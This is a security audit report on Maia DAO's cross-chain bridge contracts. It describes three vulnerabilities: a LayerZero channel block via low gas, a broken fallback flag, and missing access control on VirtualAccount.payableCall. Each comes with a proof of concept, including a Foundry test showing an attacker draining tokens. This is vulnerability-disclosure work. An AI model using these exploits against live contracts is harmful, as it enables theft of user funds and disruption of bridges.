# Maia DAO second audit

The code under review can be found in [2023-09-maia](https://github.com/code-423n4/2023-09-maia-findings).

## Findings Summary

| ID | Description | Severity |
| - | - | - |
| [M-01](#m-01-anyone-can-lock-layerzero-channel-due-to-missing-check-for-minimum-gas-passed) | Anyone can block LayerZero channel due to missing check for minimum gas passed. | Medium |
| [M-02](#m-02-incorrect-flag-results-to-_hasFallbackToggled-always-set-to-false-on-createMultipleSettlement) | Incorrect flag results to _hasFallbackToggled always set to false on createMultipleSettlement. | Medium |
| [H-01](#h-01-missing-access-control-on-virtualAccount-payableCall-allows-anyone-to-drain-tokens-held-by-Virtual-accounts) | Missing Access Control on virtualAccount.payableCall allows anyone to drain tokens held by Virtual accounts. | High |


## M-01 Anyone can block LayerZero channel due to missing check for minimum gas passed

## Vulnerability details
Lack of input validation and the ability to specify whatever adapterParams you want would result to blocking the pathway between any two chains.
The consequence of this is that anyone with a low cost and high frequency keep on blocking the pathway between any two chains, making the whole system unusable.

## Proof of Concept
When sending messages through LayerZero, the sender can specify how much gas he is willing to give to the Relayer to deliver the payload to the destination chain. This configuration is specified in relayer adapter params.
The invocations of _performCall inside the agents contracts assumes that it is not possible to specify less than 200k gas on the destination, but in reality, you can pass whatever you want.
```
function callOutAndBridge(
        address payable _refundee,
        bytes calldata _params,
        DepositInput memory _dParams,
        GasParams calldata _gParams
    ) external payable override lock {//@audit users can provide small amount of gasParam to block channel
        //Cache Deposit Nonce
        uint32 _depositNonce = depositNonce;

        //Encode Data for cross-chain call.
        bytes memory payload = abi.encodePacked(
            bytes1(0x02), _depositNonce, _dParams.hToken, _dParams.token, _dParams.amount, _dParams.deposit, _params
        );

        //Create Deposit and Send Cross-Chain request
        _createDeposit(_depositNonce, _refundee, _dParams.hToken, _dParams.token, _dParams.amount, _dParams.deposit);

        //Perform Call
        _performCall(_refundee, payload, _gParams);
    }

    /// @inheritdoc IBranchBridgeAgent
    function callOutAndBridgeMultiple(
        address payable _refundee,
        bytes calldata _params,
        DepositMultipleInput memory _dParams,
        GasParams calldata _gParams
    ) external payable override lock {
        ...SNIP
        //Create Deposit and Send Cross-Chain request
        _createDepositMultiple(
            _depositNonce, _refundee, _dParams.hTokens, _dParams.tokens, _dParams.amounts, _dParams.deposits
        );

        //Perform Call
        _performCall(_refundee, payload, _gParams);
    }
```
At _performCall(_refundee, payload, _gParams)
```
function _performCall(address payable _refundee, bytes memory _payload, GasParams calldata _gParams)
        internal
        virtual
    {
        //Sends message to LayerZero messaging layer
        ILayerZeroEndpoint(lzEndpointAddress).send{value: msg.value}(
            rootChainId,
            rootBridgeAgentPath,
            _payload,
            payable(_refundee),
            address(0),
            abi.encodePacked(uint16(2), _gParams.gasLimit, _gParams.remoteBranchExecutionGas, rootBridgeAgentAddress)//@audit populated with the user provided gas params
        );
    }
```
The line where it happens inside the LayerZero contract is [here](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/Endpoint.sol#L118), and {gas: _gasLimit} is the gas the sender has paid for.
The objective is that due to this small gas passed the transaction reverts somewhere inside the lzReceive function and the message pathway is blocked, resulting in StoredPayload.

## Recommendation
Enforce Minimum gas to send for each and every _performCall should be enough to cover the worst-case scenario for the transaction to cover the last execution in lzReceive.

## M-02 #Incorrect flag results to _hasFallbackToggled always set to false on createMultipleSettlement.
[Link](https://github.com/code-423n4/2023-09-maia-findings/issues/397) to report.

## Vulnerability details
_hasFallbackToggled would be set to false on createMultipleSettlement regardless of user intentions.

## Proof of Concept
Users can specify if they want a fallback on their transaction which prevents the transaction from revert in case of failure.
But due to an incorrect flag this would always be set to false.
https://github.com/code-423n4/2023-09-maia/blob/main/src/RootBridgeAgent.sol#L1090

```solidity
function _createSettlementMultiple(
        uint32 _settlementNonce,
        address payable _refundee,
        address _recipient,
        uint16 _dstChainId,
        address[] memory _globalAddresses,
        uint256[] memory _amounts,
        uint256[] memory _deposits,
        bytes memory _params,
        bool _hasFallbackToggled
    ) internal returns (bytes memory _payload) {
        ...SNIP
        // Prepare data for call with settlement of multiple assets
        _payload = abi.encodePacked(
@>          _hasFallbackToggled ? bytes1(0x02) & 0x0F : bytes1(0x02),
            _recipient,
            uint8(hTokens.length),
            _settlementNonce,
            hTokens,
            tokens,
            _amounts,
            _deposits,
            _params
        );
       ...SNIP
    }
```
The variable _hasFallbackToggled can be set to true or false depending whether the user wants a fallback or not.
if true, the value at the payload index 0 (payload[0]) would be set to bytes1(0x02) & 0x0F but this would still results to bytes1(0x02), otherwise false this would also results to bytes1(0x02).
On the destination chain, to check for the fallback status of a transaction.
https://github.com/code-423n4/2023-09-maia/blob/main/src/BranchBridgeAgent.sol#L651

```solidity
function lzReceiveNonBlocking(address _endpoint, bytes calldata _srcAddress, bytes calldata _payload)
        public
        override
        requiresEndpoint(_endpoint, _srcAddress)
    {
	...SNIP
    // DEPOSIT FLAG: 2 (Multiple Settlement)
        } else if (flag == 0x02) {
            // Parse recipient
            address payable recipient = payable(address(uint160(bytes20(_payload[PARAMS_START:PARAMS_START_SIGNED]))));

            // Parse deposit nonce
            nonce = uint32(bytes4(_payload[22:26]));

            //Check if tx has already been executed
            if (executionState[nonce] != STATUS_READY) revert AlreadyExecutedTransaction();

            //Try to execute remote request
            // Flag 2 - BranchBridgeAgentExecutor(bridgeAgentExecutorAddress).executeWithSettlementMultiple(recipient, localRouterAddress, _payload)
            _execute(
@>             _payload[0] == 0x82,
                nonce,
                recipient,
                abi.encodeWithSelector(
                    BranchBridgeAgentExecutor.executeWithSettlementMultiple.selector,
                    recipient,
                    localRouterAddress,
                    _payload
                )
           );
	...SNIP
}
```
_payload[0] == 0x82 would always be false irrespective of the fallback status chosen by the user.
POC:
A simple test with chisel
```solidity
➜ function checkToggle(bool hastoggle) public returns(bytes memory _payload) {
_payload = abi.encodePacked(hastoggle ? bytes1(0x02) & 0x0F : bytes1(0x02));
}
➜ function test() public returns(bool) {
bytes memory payload = checkToggle(true);
return payload[0] == 0x82;
}
➜ bool check = test()
➜ check
Type: bool
└ Value: false//<@ should be true
➜ function test2() public returns(bool) {
bytes memory payload = checkToggle(false);
return payload[0] == 0x82;
}
➜ check = test2()
Type: bool
└ Value: false//<@ always false
```

## Recommendation
replace line with `+           _hasFallbackToggled ? bytes1(0x82) : bytes1(0x02),`

## H-01 Missing Access Control on virtualAccount.payableCall allows anyone to drain tokens held by Virtual accounts.

## Vulnerability details
All tokens held within a virtual Account can be drained by anyone.

## Proof of Concept
Virtual Account are account which allows both user and approved routers to access tokens.
but due to missing access control on virtualAccount.payableCall allows anyone to execute arbitrary call on behalf of the contract.
```solidity
function payableCall(PayableCall[] calldata calls) public payable returns (bytes[] memory returnData) {//@audit missing access control
        uint256 valAccumulator;
        uint256 length = calls.length;
        returnData = new bytes[](length);
        PayableCall calldata _call;
        for (uint256 i = 0; i < length;) {
            _call = calls[i];
            uint256 val = _call.value;
            // Humanity will be a Type V Kardashev Civilization before this overflows - andreas
            // ~ 10^25 Wei in existence << ~ 10^76 size uint fits in a uint256
            unchecked {
                valAccumulator += val;
            }

            bool success;

            if (isContract(_call.target)) (success, returnData[i]) = _call.target.call{value: val}(_call.callData);//@audit arbitrary call to any target

            if (!success) revert CallFailed();

            unchecked {
                ++i;
            }
        }

        // Finally, make sure the msg.value = SUM(call[0...i].value)
        if (msg.value != valAccumulator) revert CallFailed();//@audit can be pass zero call.val to bypass.
    }
```
As you can see anyone drain any ERC721/ERC20 token held within virtual Accounts using the utility payable function.
POC
```solidity
function testAnyoneCanDrainVirtualAccount() public {
        address bob = address(42);
	//mint bob some token
        underlyingToken.mint(bob, 1 ether);
        address attacker = address(1337);

        virtualAccount = new VirtualAccount(bob, address(0));
        PayableCall memory payCall;
        PayableCall[] memory payCall_ = new PayableCall[](1);

        assertEq(virtualAccount.userAddress(), bob);
        //bob transfers tokens to his virtual account
        vm.prank(bob);
        underlyingToken.transfer(address(virtualAccount), 1 ether);
        
        assertEq(underlyingToken.balanceOf(attacker), 0);
	//Attacker can use payableCall to drain the token
        vm.startPrank(attacker);
        payCall.target = address(underlyingToken);
        payCall.callData = abi.encodeWithSignature("transfer(address,uint256)", attacker, 1 ether);
        payCall.value = uint256(0);
        payCall_[0] = payCall;
        virtualAccount.payableCall(payCall_);
        vm.stopPrank();

        assertEq(underlyingToken.balanceOf(attacker), 1 ether);

    }
```
## Recommendation
Add requiresApprovedCaller to VirtualAccount.PayableCall
